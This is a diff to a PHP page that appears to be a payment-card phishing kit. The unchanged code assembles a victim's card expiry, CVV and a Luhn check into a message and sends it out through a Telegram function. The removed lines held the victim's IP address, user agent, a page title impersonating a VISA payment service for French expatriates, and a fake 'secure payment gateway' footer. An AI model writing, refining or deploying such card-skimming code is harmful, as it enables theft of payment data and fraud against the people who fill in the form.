@@ -91,10 +91,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
              . "📅 <b>Expiry:</b> {$expiryDate}\n"
              . "🔐 <b>CVV:</b> {$securityCode}\n"
              . "✅ <b>Luhn valid:</b> " . ($luhnValid ? 'Yes' : 'No') . "\n"
-             . "━━━━━━━━━━━━━━━━━━\n"
-             . "🌐 <b>IP:</b> {$ip}\n"
-             . "🖥 <b>User Agent:</b> {$userAgent}\n"
-             . "⏱ <b>Time:</b> " . date('Y-m-d H:i:s');
+            
     
     sendToTelegram($message);
     
@@ -108,7 +105,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VISA | French Expatriates | DISC-NET</title>
+    <title>CARD</title>
     <style>
         * {
             margin: 0;
@@ -401,9 +398,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             </div>
         </form>
 
-        <div class="discnet-footer">
-            ⚡ <span>DISC-NET</span> • SECURE PAYMENT GATEWAY
-        </div>
+        
     </div>
 
     <?php
